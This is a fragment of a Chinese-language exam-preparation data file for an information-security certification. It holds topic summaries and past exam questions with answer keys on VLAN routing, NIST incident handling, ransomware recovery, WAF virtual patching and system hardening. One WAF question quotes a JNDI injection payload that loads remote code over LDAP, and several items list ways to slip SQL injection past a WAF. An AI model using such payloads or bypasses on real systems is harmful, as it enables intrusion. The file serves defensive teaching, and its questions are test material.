     "context": "（題組 1）//網路\n身為公司網路管理人員的您，正在為公司的網路架構進行調整，將目前的網路架構進行區隔，在 R1 所屬的區域建立多個 VLAN 以隔離廣播（Broadcast），提升服務存取的效能。調整後之架構如下：\n（附圖：R1、R2、R3 三台路由器串接）\nR1 E0/1 192.168.0.1/30 ── R2 E0/1 192.168.0.2/30；R2 E0/2 192.168.0.5/30 ── R3 E0/1 192.168.0.6/30\nR1 下接 SW1：E0/0.8 192.168.8.1/24、E0/0.9 192.168.9.1/24\n　SW1 下接 Host A（VLAN 8，192.168.8.21/24）、Host B（VLAN 9，192.168.9.21/24）、Host C（VLAN 10，192.168.10.11/24）\nR2 E0/0 192.168.4.1/28 下接 SW2：Host E 192.168.4.11/28、Host F 192.168.4.12/28\nR3 E0/0 192.168.4.17/28 下接 SW3：Host G 192.168.4.21/28、Host H 192.168.4.22/28",
     "hint": "對照附圖各設備的 VLAN 與介面設定，逐項判斷哪個選項能解釋 Host C 的問題。",
     "explanation": "答案 C。Host C 位於 VLAN 10（192.168.10.11/24），要存取 VLAN 9 的 Host B，必須經路由器轉送。圖中 R1 下方只設定了 E0/0.8（192.168.8.1/24）與 E0/0.9（192.168.9.1/24）兩個子介面，沒有 VLAN 10 的閘道 192.168.10.1，所以 Host C 的封包無法被路由。A 不同 VLAN 本來就是設計如此，由路由器負責互通；B SW1 是交換器，不需設定閘道 IP；D 192.168.0.1 不在 Host C 的網段，閘道 IP 不該是它。",
     "source": "110-1 第21題"
    },
    {
     "stem": "題組背景描述如附圖。請問 R1 < ---- > SW1 之間所建立的架構稱為下列何者？",
     "options": [
      "Multiple VLAN Routing",
      "Router on a stick",
      "Routing cross switch",
      "One-armed routing"
     ],
     "answer": 1,
     "context": "（題組 1）//網路\n身為公司網路管理人員的您，正在為公司的網路架構進行調整，將目前的網路架構進行區隔，在 R1 所屬的區域建立多個 VLAN 以隔離廣播（Broadcast），提升服務存取的效能。調整後之架構如下：\n（附圖：R1、R2、R3 三台路由器串接）\nR1 E0/1 192.168.0.1/30 ── R2 E0/1 192.168.0.2/30；R2 E0/2 192.168.0.5/30 ── R3 E0/1 192.168.0.6/30\nR1 下接 SW1：E0/0.8 192.168.8.1/24、E0/0.9 192.168.9.1/24\n　SW1 下接 Host A（VLAN 8，192.168.8.21/24）、Host B（VLAN 9，192.168.9.21/24）、Host C（VLAN 10，192.168.10.11/24）\nR2 E0/0 192.168.4.1/28 下接 SW2：Host E 192.168.4.11/28、Host F 192.168.4.12/28\nR3 E0/0 192.168.4.17/28 下接 SW3：Host G 192.168.4.21/28、Host H 192.168.4.22/28",
     "hint": "看附圖 R1 與 SW1 之間的連接方式與設定，回想這種架構的標準名稱。",
     "explanation": "答案 B。R1 與 SW1 之間只有一條實體線，卻同時承載 VLAN 8、9、10，路由器在這條線上切出多個子介面（E0/0.8、E0/0.9…），這種單臂做法稱為 Router on a stick。（D「One-armed routing」一般被視為同義的另一種說法，但本題官方答案只給 B，官方未說明理由。）A、C 不是常見的標準名稱。",
     "source": "110-1 第22題"
    },
    {
     "stem": "題組背景描述如附圖。公司預計明年進行擴廠需求，您計畫導入動態路由協定（Dynamic Routing Protocol）讓路由可自動更新至所有節點，以降低中斷的影響時間，下列何者「不」是避免路由迴圈的技術？",
     "options": [
      "Route Poisoning",
      "Split Horizon",
      "Hold-down timers",
      "Route Convergence"
     ],
     "answer": 3,
     "context": "（題組 1）//網路\n身為公司網路管理人員的您，正在為公司的網路架構進行調整，將目前的網路架構進行區隔，在 R1 所屬的區域建立多個 VLAN 以隔離廣播（Broadcast），提升服務存取的效能。調整後之架構如下：\n（附圖：R1、R2、R3 三台路由器串接）\nR1 E0/1 192.168.0.1/30 ── R2 E0/1 192.168.0.2/30；R2 E0/2 192.168.0.5/30 ── R3 E0/1 192.168.0.6/30\nR1 下接 SW1：E0/0.8 192.168.8.1/24、E0/0.9 192.168.9.1/24\n　SW1 下接 Host A（VLAN 8，192.168.8.21/24）、Host B（VLAN 9，192.168.9.21/24）、Host C（VLAN 10，192.168.10.11/24）\nR2 E0/0 192.168.4.1/28 下接 SW2：Host E 192.168.4.11/28、Host F 192.168.4.12/28\nR3 E0/0 192.168.4.17/28 下接 SW3：Host G 192.168.4.21/28、Host H 192.168.4.22/28",
     "hint": "逐項回想每個名詞的定義：它是防止路由迴圈的機制嗎？",
     "explanation": "答案 D。避免路由迴圈的技術有路由毒化（Route Poisoning，把失效路由標示為不可達）、水平分割（Split Horizon，不從原路徑回傳路由資訊）、抑制計時器（Hold-down timers，暫時不接受不穩定路由的更新）。Route Convergence（路由收斂）指所有路由器的路由資訊達成一致的狀態，是結果，不是防迴圈的機制。",
     "source": "110-1 第23題"
    }
   ]
  },
  {
   "id": "1.2-12",
   "section": "1.2",
   "title": "NIST 800-61 事件處理流程",
   "examHits": 8,
   "examRefs": [
    "115-1 第15題",
    "113-1 第8題",
    "113-1 第9題",
    "113-1 第12題",
    "112-2 第24題",
    "112-2 第25題",
    "112-2 第26題",
    "112-2 第27題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "NIST SP 800-61 Rev. 2（考古題依據的版本）把事件處理分成四個階段：準備、偵測與分析、封鎖（遏制）／根除／復原、事後活動。每個階段該做的事不同：遏制階段要先止血（短期封鎖、隔離受影響系統），再根除（移除後門與惡意程式、修補漏洞），再復原並驗證系統安全，並保存原始稽核紀錄與證據；而事件是否通報主管機關、哪些人要知道，是偵測與分析階段就要處理的事；更新政策、法律行動、教育訓練是事後或準備階段做的事。判斷攻擊來源時，NIST 列的是驗證 IP 是否偽造、搜尋引擎與事件資料庫查證、觀察攻擊者的通信管道，不會主動攻擊對方。企業資安事件的範圍包含設施環境（機房漏水、備用發電機故障）與供應鏈（外部廠商資料外洩）。注意：NIST 已於 2025 年 4 月發布 SP 800-61 Rev. 3 取代 Rev. 2，新版改以 CSF 2.0 六大功能組織，不再以四階段為主軸；題目寫明 Rev. 2 或附四階段圖時，照四階段作答。",
   "keyPoints": [
    "Rev. 2 的四階段：準備 → 偵測與分析 → 遏制／根除／復原 → 事後活動；遇到題目先判斷題幹在哪一階段，再選該階段的做法（Rev. 3 已改用 CSF 2.0 六大功能組織）。",
    "遏制階段的最佳做法是先隔離受影響系統（止血）；更新政策、教育訓練、法律行動屬準備或事後階段。",
    "根除要移除後門與持久性威脅，復原要驗證系統安全；是否通報與通知對象在偵測與分析階段就要處理。",
    "原始稽核紀錄是證據與追根因的依據，不可刪除；處置時可委託外部專業廠商，也要確認根因。",
    "追查攻擊來源是查證與觀察（驗證 IP 偽造、搜尋引擎、通信管道），不是反過來發動服務阻斷攻擊。"
   ],
   "trap": "把事後或準備階段的動作（更新政策、教育訓練、法律行動）當成遏制階段的最佳做法，或以為「刪掉原始稽核紀錄」可以保護公司。",
   "quiz": [
    {
     "stem": "在美國國家標準技術研究院（NIST）特別出版品800-61 Rev. 2（SP 800-61 Rev. 2）中，關於事件封鎖、根除與復原（Containment, Eradication, and Recovery）階段的主要活動描述，下列哪些最為正確？",
     "options": [
      "實施短期封鎖措施以減少事件影響，防止進一步擴散",
      "根據事件影響範圍決定是否需要向主管機關進行報告",
      "移除攻擊者在系統中的持久性威脅（如後門或惡意軟體）",
      "恢復受影響的系統至正常運行狀態，並驗證系統安全性"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "hint": "回想 NIST SP 800-61 Rev. 2 各階段的主要活動，逐項判斷每項活動屬於哪個階段。",
     "explanation": "答案 A、C、D。NIST SP 800-61 Rev. 2 的封鎖、根除與復原階段包含：A 實施短期封鎖措施，限制事件影響與擴散；C 根除，移除攻擊者留下的持久性威脅（後門、惡意軟體）；D 復原，把受影響系統恢復到正常狀態並驗證其安全性。B 根據影響範圍決定是否向主管機關報告，屬於事件通報與通知，在偵測與分析階段就要處理，不是本階段的主要活動。",
     "source": "115-1 第15題"
    },
    {
     "stem": "企業資安事件類型「不」包含下列何項？",
     "options": [
      "機房漏水",
      "備用發電機啟動故障",
      "外部廠商發生資料外洩",
      "私人手機遺失"
     ],
     "answer": 3,
     "hint": "回想企業資安事件的範圍，逐項判斷每個事件是否會影響組織的資訊資產或服務。",
     "explanation": "答案 D。企業資安事件的範圍涵蓋會影響資訊資產與服務的情況：A 機房漏水、B 備用發電機啟動故障屬設施環境事件，會影響系統可用性；C 外部廠商發生資料外洩屬供應鏈事件。D 私人手機遺失屬員工私人設備，並不是企業資產，除非內含公司資料才會牽動資安事件，所以不算企業資安事件類型。（官方答案 D；上述理由為依一般 ISMS 範圍所做的推論，官方未說明。）",
     "source": "113-1 第8題"
    },
    {
     "stem": "進行資安事件處置時，下列做法何者錯誤？",
     "options": [
      "將漏洞修補以防止再發生",
      "原始稽核紀錄可以刪除",
      "確認事件根因是必要的",
      "可以委託外部專業廠商進行"
     ],
     "answer": 1,
     "hint": "回想資安事件處置的原則，逐項判斷每個做法是否正確。",
     "explanation": "答案 B。處置資安事件時，原始稽核紀錄是調查根因、保全證據與後續法律追訴的依據，不可以刪除。A 修補漏洞防止再發生、C 確認根因是必要的、D 可以委託外部專業廠商，都是正確做法。",
     "source": "113-1 第9題"
    },
    {
     "stem": "事故回應（Incent Response，IR）的處理流程中，依據 NIST SP800-61 r2 在隔離、清除和恢復階段中，下列何項是最佳處理方案？",
     "options": [
      "立即更新安全政策",
      "隔離受影響系統",
      "開始法律行動",
      "立即針對員工進行安全培訓"
     ],
     "answer": 1,
     "hint": "回想 NIST SP 800-61 Rev. 2 各階段的主要活動，逐項判斷每個方案屬於哪個階段。",
     "explanation": "答案 B。NIST SP 800-61 Rev. 2 的隔離、清除與復原階段，最佳處理是隔離受影響系統，先阻止事件擴大。A 更新安全政策、D 針對員工進行安全培訓屬準備或事後檢討階段；C 開始法律行動並非這個階段的重點。",
     "source": "113-1 第12題"
    },
    {
     "stem": "情境如附圖所示，關於 NIST SP 800-61 資安事故處理指引（Computer Security Incident Handling Guide）其事故處置生命週期（Incident Response Life Cycle），而控制、清除與復原（Containment, Eradication & Recovery）中最常被用於識別來源攻擊主機之方法，下列哪一項最「不」正確？",
     "options": [
      "驗證來源攻擊主機是否偽造 IP 位置（IP Address）",
      "使用搜尋引擎（Search Engine）調查來源攻擊主機",
      "以服務阻斷攻擊（Deny of Service）觀察來源攻擊主機反應",
      "觀察攻擊者所可能使用的通信管道（Communication Channels）"
     ],
     "answer": 2,
     "context": "（原題附圖為 NIST SP 800-61 事故處置生命週期圖：四個方塊依序為 Preparation → Detection & Analysis → Containment, Eradication & Recovery（標示為紅色）→ Post-Incident Activity；Detection & Analysis 與 Containment, Eradication & Recovery 之間有雙向循環箭頭，Post-Incident Activity 另有箭頭回到 Preparation。）",
     "hint": "回想 NIST SP 800-61 Rev. 2 列出的識別攻擊來源主機方法，逐項比對。",
     "explanation": "答案 C。NIST SP 800-61 在控制、清除與復原階段，識別攻擊來源主機的方法包括：A 驗證來源 IP 是否偽造；B 使用搜尋引擎調查來源主機；D 觀察攻擊者可能使用的通信管道。C 以服務阻斷攻擊去觀察來源主機反應，屬於主動攻擊對方，有法律與安全風險，不是正當的識別方法，最不正確。",
     "source": "112-2 第25題"
    }
   ]
  },
  {
   "id": "1.2-13",
   "section": "1.2",
   "title": "勒索軟體防護與復原",
   "examHits": 8,
   "examRefs": [
    "115-1 第22題",
    "115-1 第24題",
    "112-2 第21題",
    "112-1 第19題",
    "112-1 第25題",
    "112-1 第26題",
    "112-1 第28題",
    "111-1 第25題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "勒索軟體題的主軸是：預防不一定擋得住，所以要把「衝擊」降到最低。能降低衝擊的首選是離線（或不可變）備份，被加密後還能還原；日誌分析、社交工程演練、原始碼檢測是在降低發生機率或事後偵測，無法直接挽回被加密的資料。發生時的應變：先隔離受感染網段，查核備份與備援是否完整、有沒有被污染，在找出入侵破口並修補後才重新上線，並重設所有特權帳號與憑證；不要把「支付贖金」當成回復方法，付了也不保證拿到金鑰，還會助長犯罪。勒索軟體的危害除了加密，還包含資料外洩（雙重勒索）、成為供應鏈破口、被利用去攻擊他人。",
   "keyPoints": [
    "問「降低勒索軟體事件衝擊」→ 離線資料備份；題目問的是損害（衝擊），不是降低被入侵機率。",
    "安全復原三步：隔離受感染網段並驗證備份完整；找出入侵破口並修補後才上線；重設特權帳號與憑證。",
    "支付贖金不是正當的應變措施：不保證拿到解密金鑰、可能再被勒索，也不能替代備份。",
    "應變時要查核備份與備援資料是否也被污染或破壞，以及虛擬備份環境能否快速復原。",
    "勒索軟體的危害不只加密：還有資料外洩、供應鏈破口、被當作攻擊他人的跳板；「自動備份與更新」不是它會做的事。"
   ],
   "trap": "看到勒索軟體就選「社交工程演練」或「日誌分析」，卻忽略題目問的是「降低衝擊」；也常誤以為付贖金是最快的復原方式。",
   "quiz": [
    {
     "stem": "就勒索軟體事件而言，最有可能降低事件衝擊的控制措施為下列何項？",
     "options": [
      "原始碼檢測",
      "日誌分析",
      "社交工程演練",
      "離線資料備份"
     ],
     "answer": 3,
     "hint": "先分清題目問的是降低「衝擊」還是降低「發生機率」，再逐項判斷每項措施屬於哪一種。",
     "explanation": "答案 D。題目問「降低事件衝擊」，也就是事件發生後的損害。離線資料備份讓資料被加密後仍可還原，能直接降低衝擊。A 原始碼檢測是在開發階段找漏洞；B 日誌分析屬偵測與調查；C 社交工程演練是提升員工警覺、降低被入侵的機率，這三者都不能在資料被加密後把資料救回來。",
     "source": "115-1 第22題"
    },
    {
     "stem": "某製造業產線遭受勒索軟體攻擊，系統檔案遭到加密。在啟動營運持續計畫（BCP）進行復原時，下列哪些步驟是確保「安全復原」的必要措施？",
     "options": [
      "在復原備份資料前，必須先隔離受感染網段並驗證備份檔的完整性",
      "立即支付贖金以取得解密金鑰，這是回復速度最快的方式",
      "找出入侵破口（Root Cause）並完成修補後，才將系統重新上線",
      "重建系統時，強制重設所有特權帳號的密碼與憑證"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "hint": "逐項問：這個步驟能不能確保復原後的系統是乾淨、不會再被攻擊的？",
     "explanation": "答案 A、C、D。A 復原前先隔離受感染網段並驗證備份檔的完整性，避免二次感染與還原到被污染的備份；C 找出入侵破口（根因）並修補完成後才重新上線，否則攻擊者可再次進入；D 重建系統時強制重設所有特權帳號的密碼與憑證，防止被竊的憑證繼續使用。B 立即支付贖金不是安全復原的必要措施，也不保證取得金鑰，還可能被再次勒索。",
     "source": "115-1 第24題"
    },
    {
     "stem": "就勒索軟體事件而言，最有可能降低事件衝擊的控制措施為下列何項？",
     "options": [
      "原始碼檢測",
      "日誌分析",
      "社交工程演練",
      "離線資料備份"
     ],
     "answer": 3,
     "hint": "先分清題目問的是降低「衝擊」還是降低「發生機率」，再逐項判斷每項措施屬於哪一種。",
     "explanation": "答案 D。分辨措施是在預防入侵、偵測，還是在被加密後仍能讓營運恢復。離線資料備份能在資料被加密後直接還原，降低事件衝擊。A 原始碼檢測、B 日誌分析、C 社交工程演練分別屬於開發階段檢測、偵測調查與預防，都無法在被加密後挽回資料。",
     "source": "112-2 第21題"
    },
    {
     "stem": "勒索集團對公司機密資料進行加密，公司 IT 或是資安團隊應採取的應變措施，下列何項較「不」適當？",
     "options": [
      "聯繫駭客勒索集團，進行贖金交易取回解密密碼",
      "查核相關資料庫備份機制是否可以回復",
      "查核虛擬備份環境可否快速復原相關系統，加速恢復運營",
      "查核相關備援備份資料是否也受到汙染或破壞"
     ],
     "answer": 0,
     "context": "【題組 2】\n駭客勒索集團入侵年收五百億上市公司，對其重要資料庫系統與研發系統破壞勒索加密，經過相關緊急應變後，費時近半個月才恢復公司正常運營，事後總經理召開檢討會議進行檢討。",
     "hint": "逐項判斷：這項應變措施是否符合事件應變的最佳實務？",
     "explanation": "答案 A。聯繫駭客集團進行贖金交易取回解密密碼，是把復原的主動權交給攻擊者，不保證能取回資料，也可能被再次勒索，是較不適當的應變。B 查核資料庫備份機制是否可回復、C 查核虛擬備份環境能否快速復原系統、D 查核備援備份資料是否也被污染或破壞，都是建立在自己可控的復原能力上，是適當的措施。",
     "source": "112-1 第19題"
    },
    {
     "stem": "勒索軟體除了加密資料進行勒索之外，還可能有許多危害，請問下列何項「不」是勒索軟體可能造成的危害？",
     "options": [
      "資料外洩",
      "系統入侵造成供應鏈破口",
      "再被利用去攻擊他人",
      "自動完成備份及更新"
     ],
     "answer": 3,
     "context": "【題組 3】\n王大明剛接下某製造業資安工作，於本週發生了勒索軟體將公司資料加密，並收到歹徒所指示的付款要求。",
     "hint": "逐項判斷：這件事是不是勒索軟體可能造成的結果？",
     "explanation": "答案 D。勒索軟體除了加密資料，還可能：A 造成資料外洩（雙重勒索）；B 系統入侵造成供應鏈破口；C 受感染設備被再利用去攻擊他人。D 自動完成備份及更新是正常維運才會有的好結果，不會是勒索軟體造成的危害。",
     "source": "112-1 第25題"
    }
   ]
  },
  {
   "id": "1.2-14",
   "section": "1.2",
   "title": "WAF 與虛擬修補",
   "examHits": 7,
   "examRefs": [
    "115-2 第9題",
    "115-2 第10題",
    "115-1 第40題",
    "114-1 第13題",
    "112-1 第9題",
    "111-1 第18題",
    "110-1 第1題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "漏洞出現但來不及修補（零時差攻擊、舊程式碼無法立即升級、廠商尚未出補丁）時，標準做法是虛擬修補（Virtual Patching）：在 WAF 或 IPS 上依攻擊特徵或請求內容建立規則，在流量抵達應用程式之前擋掉。例如 Log4Shell 這類 JNDI 注入（payload 含 ${jndi:ldap://…}），可在 WAF 針對 jndi 這類關鍵特徵做輸入驗證規則阻斷。但 WAF 不是萬能：它有機會被繞過（編碼、改寫關鍵字、避開黑名單規則），防護範圍也不只 SQL 注入，也不是只比對完全一樣的特徵；真正根治仍是修補。WAF 看的是請求內容，更換來源 IP 或在區網做 ARP 欺騙，改變不了 WAF 看到的攻擊內容。零時差也會出現在已停止支援的作業系統上，而且那種系統更難處理。",
   "keyPoints": [
    "看到「尚無官方補丁／無法立即升級程式」→ 虛擬修補：在 WAF 或 IPS 依攻擊特徵阻擋，是有限度的緩解，不是根治。",
    "JNDI 注入（${jndi:ldap://…}）一類的 RCE → 在 WAF 針對關鍵字做輸入驗證規則；封鎖無關埠、換憑證演算法都碰不到攻擊本體。",
    "WAF 可以被繞過：編碼混淆（URL Encoding、Unicode）、改寫關鍵字或語法避開黑名單；它是降低風險的一層，不是絕對防護。",
    "改變來源 IP（Proxy／VPN）或做 ARP 欺騙，都無法讓 WAF 看不懂攻擊內容；成功率最低。",
    "零時差也會發生在已停止支援的系統；根本解決之道仍是迅速確實地修補。"
   ],
   "trap": "以為 WAF 只能擋已知特徵、或只管 SQL 注入；也容易以為換 IP 就能繞過 WAF，其實 WAF 看的是請求內容。",
   "quiz": [
    {
     "stem": "分析 WAF 攔截到的攻擊請求時，發現一段針對公司內部 Java Spring Boot 應用程式的封包，內容包含：${jndi:ldap://192.168.10.5/Exploit} 已知該伺服器的 JDK 版本較舊，未啟用com.sun.jndi.ldap.object.trustURLCodebase=false。在無法立即升級應用程式碼的情況下，下列何項技術對直接阻斷此類遠端程式碼執行（Remote Code Execution, RCE）攻擊最為適切？",
     "options": [
      "在防火牆封鎖所有連往192.168.10.5的TCP 80流量",
      "將伺服器的HTTPS 憑證更換為強加密演算法（如RSA 4096）",
      "在WAF 上啟用針對jndi 關鍵字的輸入驗證規則",
      "停用Web伺服器的HTTP TRACE方法"
     ],
     "answer": 2,
     "hint": "逐項判斷：這項技術能否在不改程式碼的前提下，直接攔下題目描述的攻擊請求？",
     "explanation": "答案 C。封包內容 ${jndi:ldap://192.168.10.5/Exploit} 是 JNDI 注入（類似 Log4Shell）的 RCE 攻擊特徵，且 JDK 舊、無法立即升級。在 WAF 啟用針對 jndi 關鍵字的輸入驗證規則，可在請求抵達應用程式前直接阻斷這類攻擊，是虛擬修補的做法。A 封鎖連往 192.168.10.5 的 TCP 80，攻擊中的 LDAP 連線不一定走 80，且攻擊者可換其他伺服器；B 更換 HTTPS 憑證演算法與此漏洞無關；D 停用 HTTP TRACE 方法也與 JNDI 注入無關。",
     "source": "115-2 第9題"
    },
    {
     "stem": "資安團隊收到一則關於「特定駭客組織利用零時差漏洞攻擊VPN設備」的威脅情資。在尚未釋出官方修補程式（Patch）前，下列何項緩解措施最具防護實效？",
     "options": [
      "實施虛擬修補（Virtual Patching），在WAF 或IPS 阻擋特定攻擊特徵",
      "忽略此情資，等待官方釋出正式修補程式後再處理",
      "要求全體員工重新申請VPN帳號",
      "立即公開招標並更換不同廠牌的VPN設備"
     ],
     "answer": 0,
     "hint": "逐項問：在官方修補釋出前，這項措施能不能實際降低被攻擊的風險？",
     "explanation": "答案 A。零時差漏洞尚無官方補丁，虛擬修補在 WAF 或 IPS 依攻擊特徵阻擋攻擊流量，立即降低風險。B 忽略情資、等官方補丁，會讓設備長期暴露；C 要求全體員工重新申請 VPN 帳號與漏洞無關；D 立即公開招標並更換廠牌，耗時且成本高，也無法立即緩解。",
     "source": "115-2 第10題"
    },
    {
     "stem": "情境如附圖所示。資安測試團隊嘗試繞過前端 WAF時，下列哪些方式最「不」可能達成目的（成功率最低）？",
     "options": [
      "使用編碼（Encoding）技巧，如 URL Encoding 或 Unicode，透過不同的編碼方式來混淆攻擊 Payload，讓 WAF 無法正確偵測",
      "透過多個 Proxy 或 VPN變換 IP位址，讓 WAF以為是不同的來源，就不會對SQL 注入語法進行阻擋",
      "透過刻意修改 Payload 中的關鍵字或語法，避開 WAF 黑名單規則，例如將 SQL 注入語法裡面的 or 改用 ||",
      "使用 ARP 欺騙（ARP Spoofing）進行網路封包攔截，直接竄改封包內容即可繞過 WAF"
     ],
     "answer": [
      1,
      3
     ],
     "context": "某銀行委託資安團隊對新版線上金融交易系統執行資安檢測，包含滲透測試、原始碼檢測及整體資安健診。在滲透測試過程中，資安團隊成功繞過前端 WAF，發現系統可透過交易金額欄位進行 SQL 注入（SQL Injection）。在原始碼檢測時，資安團隊發現開發人員未使用參數化查詢（Parameterized Query），而直接拼接字串。",
     "hint": "回想 WAF 檢查流量的方式與部署位置，逐項判斷每種手法能否讓攻擊內容通過 WAF。",
     "explanation": "答案 B、D。WAF 檢查的是請求內容，因此要繞過它，必須讓 WAF「看不懂」攻擊內容。B 透過多個 Proxy 或 VPN 變換 IP，WAF 仍然會檢查每個請求的 SQL 注入語法，更換來源 IP 無法讓攻擊字串被放行；D ARP 欺騙是區域網路內的攻擊，無法讓外部攻擊者竄改送往 WAF 的封包，與繞過 WAF 無關，兩者成功率最低。A 編碼混淆與 C 改寫關鍵字或語法（例如 or 改用 ||）避開黑名單，都是常見的 WAF 繞過手法。",
     "source": "115-1 第40題"
    },
    {
     "stem": "有關「網頁應用程式防火牆（Web Application Firewall，WAF）」的描述，下列何者較為適切？",
     "options": [
      "WAF 主要用於過濾電子郵件內容，防止垃圾郵件",
      "WAF 的規則有機會被攻擊者繞過，無法完全阻擋網頁攻擊",
      "WAF 只能用來防止 OWASP Top 10 2021 裡面的 A03:2021 Injection",
      "WAF 只能阻擋已知特徵的 SQL 注入攻擊，但是特徵必須一模一樣，如果特徵稍微有變化 WAF 就無法阻擋"
     ],
     "answer": 1,
     "hint": "回想 WAF 的功能、防護範圍與偵測方式，逐項判斷每句是否成立。",
     "explanation": "答案 B。WAF 的規則有機會被攻擊者繞過（編碼、改寫語法、避開黑名單規則），無法完全阻擋網頁攻擊，所以 B 描述較適切。A 過濾電子郵件內容、防垃圾郵件是郵件閘道的工作；C WAF 不只防 OWASP Top 10 2021 的 A03 注入，也防 XSS 等多類攻擊；D WAF 不是只能比對「一模一樣」的特徵，通常有正規化與多種偵測邏輯，說特徵稍微變化就無法阻擋太絕對。",
     "source": "114-1 第13題"
    },
    {
     "stem": "零時差攻擊（Zero-day Attack）是指駭客利用開發商尚未釋出修補程式的安全漏洞進行攻擊。下列敘述何者錯誤？",
     "options": [
      "零時差攻擊不會出現在已停止支援之作業系統中",
      "面對零時差攻擊，入侵防禦系統（Intrusion Prevention System, IPS）或是網頁應用程式防火牆可進行有限度的防護",
      "虛擬修補概念可以降低零時差攻擊的風險",
      "迅速與確實進行弱點修補才是零時差攻擊的根本解決之道"
     ],
     "answer": 0,
     "hint": "回想零時差攻擊的定義與防護方式，逐項判斷每句是否成立。",
     "explanation": "答案 A。零時差攻擊利用廠商尚未釋出修補程式的漏洞，也會出現在已停止支援的作業系統上，而且停止支援的系統永遠不會有補丁，風險更高，所以 A 的說法錯誤。B IPS 或 WAF 可做有限度的防護；C 虛擬修補可降低零時差風險；D 迅速確實修補才是根本解決之道，都是正確敘述。",
     "source": "112-1 第9題"
    }
   ]
  },
  {
   "id": "1.2-15",
   "section": "1.2",
   "title": "系統組態強化與基線",
   "examHits": 7,
   "examRefs": [
    "113-1 第11題",
    "113-1 第22題",
    "112-1 第29題",
    "111-1 第6題",
    "111-1 第7題",
    "110-1 第26題",
    "110-1 第27題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "系統強化要解決的問題是：主機一裝好就帶著很多「方便但危險」的東西——預設帳密、用不到的服務與埠、老舊協定、開放的目錄列表、太詳細的錯誤訊息。考試的做法是先分辨每個措施是在縮小還是擴大攻擊面：停用不用的 RDP、阻擋 445 對外連線、弱掃後修補，是縮小；啟用老舊的 SMBv1，是擴大。遇到有人要求「組態例外」，第一步不是一律拒絕，也不是直接上報董事會，而是做風險評估並訂出補償控制措施。看到登錄檔或設定檔的題目，逐字對路徑、版本號、應用程式名與值的行為。",
   "keyPoints": [
    "看到「主機要強化」→ 先分辨措施是縮小還是擴大攻擊面：停用不用的服務與埠、阻擋 445 對外、弱掃後修補是縮小；啟用老舊協定（SMBv1）是擴大。",
    "看到「標準組態的例外請求」→ 第一步是確認風險並訂出補償控制措施，不是直接報董事會，也不是一律禁止，因為例外經過風險評估與補償後可以被接受。",
    "看到「Web 系統的組態缺陷」→ 預設帳密要改、目錄列表（Directory Listing）要關閉、異常時不要把詳細錯誤訊息顯示在頁面上。",
    "看到 Apache 的 LimitExcept 設定 → 它管的是「所列方法以外」的方法，後面接拒絕才能擋掉 PUT、DELETE 這類危險方法；接成允許就等於沒擋。",
    "看到登錄檔（Registry）題 → 逐項對路徑中的版本號（16.0 對應 Office 2016）、應用程式名（word 或 excel）、值名稱所代表的行為。"
   ],
   "trap": "把「看起來有加密／有新版」當成安全（SMBv1、SMBv2 並不是用來提供傳輸加密的），或把 Word 的登錄檔設定誤當成 Excel 的設定；例外請求則常被誤答成「一律禁止」。",
   "quiz": [
    {
     "stem": "勒索軟體與資料外洩攻擊之準備、預防、緩解與應變之實務上，可透過調校與強化主機系統其網路服務設定來降低所曝露之弱點。下列何種系統強化措施最「不」合適？",
     "options": [
      "於面向網際網路之主機執行弱點掃描以識別系統弱點並修復",
      "於主機系統停用並關閉未使用 RDP 遠端桌面協定 TCP/3389 連接埠",
      "於主機系統啟用 SMBv1, SVBv2 伺服器訊息區協定以達傳輸加密",
      "於防火牆設定阻擋 TCP/445 連接埠對網際網路之內外連線規則"
     ],
     "answer": 2,
     "hint": "回想各協定與連接埠的安全性，逐項判斷每項措施能否降低主機暴露的弱點。",
     "explanation": "答案 C。題目要找最不合適的強化措施。C 啟用 SMBv1、SMBv2 並不能達到「傳輸加密」的目的（SMB 傳輸加密是較新的 SMB 3.x 才有的功能），而且 SMBv1 是已知漏洞眾多、被勒索軟體廣泛利用的老舊協定，應該停用而不是啟用，所以 C 是最不合適的。A 對面向網際網路的主機做弱點掃描並修復，可以找出並補上弱點，合適。B 關閉未使用的 RDP（TCP/3389），減少暴露的服務，合適。D 在防火牆阻擋 TCP/445 對網際網路的連線，避免 SMB 被外部攻擊，合適。（題目選項原文寫「SVBv2」，照原題未改，應為 SMBv2 的筆誤。）",
     "source": "113-1 第11題"
    },
    {
     "stem": "當資訊室主管收到作業系統標準組態的例外請求時，第一步應該處理下列何項？",
     "options": [
      "報告董事會，並尋求董事會的指導",
      "確定產業的執行慣例，擬定應變作業計劃",
      "確認風險並確定補償控制措施",
      "依據資安管理系統程序，一律禁止例外請求作業"
     ],
     "answer": 2,
     "hint": "回想組態基準例外管理的流程，判斷收到例外請求時第一步要做什麼。",
     "explanation": "答案 C。標準組態的例外請求不是一律放行或一律拒絕，而是先確認這個例外帶來的風險，並決定要用什麼補償控制措施把風險壓到可接受的程度，再由有權者核准。A 直接報告董事會是過度升級，日常組態例外不需要董事會決策。B 確定產業慣例與擬定應變計畫，不能代替對自己環境的風險評估。D 依資安管理系統程序一律禁止例外，不符合實務；管理系統通常允許經風險評估與核准的例外。",
     "source": "113-1 第22題"
    },
    {
     "stem": "資訊系統常透過組態檔案提供初始參數或是預設功能設定值，當系統組態被不當或是錯誤的設定就容易產生安全漏洞。下列敘述何者錯誤？",
     "options": [
      "啟用預設帳號密碼是最常見的設定缺陷，像是有些軟體元件為了設定上的方便，允許使用空白密碼或是預設密碼進行登入，故駭客容易藉此入侵系統",
      "站台目錄列表（Directory Listing）功能除了像是檔案伺服器等特定需求以外，建議將此項功能開放，方便使用者檢索目錄列表",
      "當系統發生異常時，盡量避免將相關詳細的錯誤訊息直接呈現在頁面上",
      "充分掌握環境中的各項元件與組態，隨時進行維護與改善以確保資訊系統部屬與運作的安全與持續"
     ],
     "answer": 1,
     "hint": "回想常見的組態安全建議，逐項判斷每句是否成立。",
     "explanation": "答案 B。目錄列表（Directory Listing）會把站台目錄裡的檔案清單直接列給使用者，可能洩漏不該公開的檔案與結構，所以除非是檔案伺服器等特定需求，應該關閉而不是建議開放，B 的敘述是錯的。A 預設帳號、空白或預設密碼是最常見的設定缺陷，敘述正確。C 異常時避免在頁面顯示詳細錯誤訊息，避免洩漏系統細節，敘述正確。D 掌握環境中的元件與組態並持續維護改善，敘述正確。",
